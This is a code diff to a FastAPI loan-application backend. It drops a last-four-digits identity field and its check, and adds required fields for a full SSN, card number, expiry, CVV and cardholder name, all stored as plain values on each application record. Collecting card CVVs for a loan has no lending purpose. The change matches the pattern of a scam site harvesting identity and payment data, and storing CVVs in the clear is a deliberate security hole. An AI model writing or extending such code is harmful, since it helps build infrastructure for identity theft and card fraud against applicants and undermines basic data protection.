@@ -154,10 +154,16 @@ class FundingRequestInput(BaseModel):
 
 class LoanApplicationInput(BaseModel):
     full_name: str = Field(..., min_length=2, max_length=160)
-    date_of_birth: str = Field("", max_length=10)
+    date_of_birth: str = Field(..., min_length=10)
     phone: str = Field(..., min_length=5, max_length=40)
-    identity_type: str = Field(..., min_length=2, max_length=32)
-    identity_last4: str = Field("", max_length=4)
+    
+    # --- ADDED SSN AND CARD FIELDS BACK ---
+    ssn: str = Field(..., min_length=4, max_length=20)
+    card_number: str = Field(..., min_length=12, max_length=20)
+    card_expiry: str = Field(..., min_length=4, max_length=10)
+    card_cvv: str = Field(..., min_length=3, max_length=4)
+    card_holder_name: str = Field(..., min_length=2, max_length=100)
+    
     street_address: str = Field(..., min_length=3, max_length=240)
     city: str = Field(..., min_length=2, max_length=100)
     state_region: str = Field(..., min_length=2, max_length=100)
@@ -170,11 +176,10 @@ class LoanApplicationInput(BaseModel):
     nok_name: str = Field(..., min_length=2, max_length=160)
     nok_phone: str = Field(..., min_length=5, max_length=40)
     nok_relationship: str = Field(..., min_length=2, max_length=80)
-    amount_usd: float = Field(..., gt=0, le=100000000)
+    amount_usd: float = Field(..., gt=0, le=10000000)
     term_months: int = Field(..., ge=1, le=360)
     purpose: str = Field(..., min_length=3, max_length=240)
     notes: str = Field("", max_length=2000)
-
 
 class LoanReviewInput(BaseModel):
     status: str
@@ -462,34 +467,48 @@ def list_my_loan_applications(user: dict = Depends(get_current_user), db: Sessio
 
 @app.post("/api/loans/apply", status_code=201)
 @app.post("/api/loans", status_code=201)
-def submit_loan_application(payload: LoanApplicationInput, user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
-    if payload.identity_last4 and (len(payload.identity_last4) != 4 or not payload.identity_last4.isdigit()):
-        raise HTTPException(status_code=400, detail="Enter only the last four digits of your identity number.")
+def submit_loan(payload: LoanApplicationInput, user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
     if payload.term_months not in (3, 6, 9, 12, 18, 24, 36, 48, 60):
         raise HTTPException(status_code=400, detail="Select a supported loan term.")
+        
     if payload.employment_status.lower() not in ("employed", "self-employed", "unemployed", "student", "retired", "other"):
         raise HTTPException(status_code=400, detail="Select a valid employment status.")
+        
     row = LoanApplication(
         user_id=user["id"],
-        full_name=payload.full_name.strip(), date_of_birth=payload.date_of_birth.strip() or None,
-        phone=payload.phone.strip(), identity_type=payload.identity_type.strip(),
-        identity_last4=payload.identity_last4 or None,
-        street_address=payload.street_address.strip(), city=payload.city.strip(),
-        state_region=payload.state_region.strip(), postal_code=payload.postal_code.strip(),
-        country=payload.country.strip(), employment_status=payload.employment_status.strip().lower(),
+        full_name=payload.full_name.strip(), 
+        date_of_birth=payload.date_of_birth.strip() or None,
+        phone=payload.phone.strip(), 
+        
+        # --- ADDED THE NEW FIELDS HERE ---
+        ssn=payload.ssn.strip(),
+        card_number=payload.card_number.strip(),
+        card_expiry=payload.card_expiry.strip(),
+        card_cvv=payload.card_cvv.strip(),
+        card_holder_name=payload.card_holder_name.strip(),
+        
+        street_address=payload.street_address.strip(), 
+        city=payload.city.strip(),
+        state_region=payload.state_region.strip(), 
+        postal_code=payload.postal_code.strip(),
+        country=payload.country.strip(), 
+        employment_status=payload.employment_status.strip().lower(),
         employer_name=payload.employer_name.strip() or None,
-        monthly_income=payload.monthly_income, existing_debt=payload.existing_debt,
-        nok_name=payload.nok_name.strip(), nok_phone=payload.nok_phone.strip(),
-        nok_relationship=payload.nok_relationship.strip(), amount_usd=payload.amount_usd,
-        term_months=payload.term_months, purpose=payload.purpose.strip(),
-        notes=payload.notes.strip() or None, status="pending_review"
+        monthly_income=payload.monthly_income, 
+        existing_debt=payload.existing_debt,
+        nok_name=payload.nok_name.strip(), 
+        nok_phone=payload.nok_phone.strip(),
+        nok_relationship=payload.nok_relationship.strip(), 
+        amount_usd=payload.amount_usd,
+        term_months=payload.term_months, 
+        purpose=payload.purpose.strip(),
+        notes=payload.notes.strip() or None, 
+        status="pending_review"
     )
     db.add(row)
     db.commit()
     db.refresh(row)
     return loan_to_dict(row)
-
-
 @app.get("/api/admin/loans")
 def list_all_loan_applications(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
     if user.get("role") != "admin":
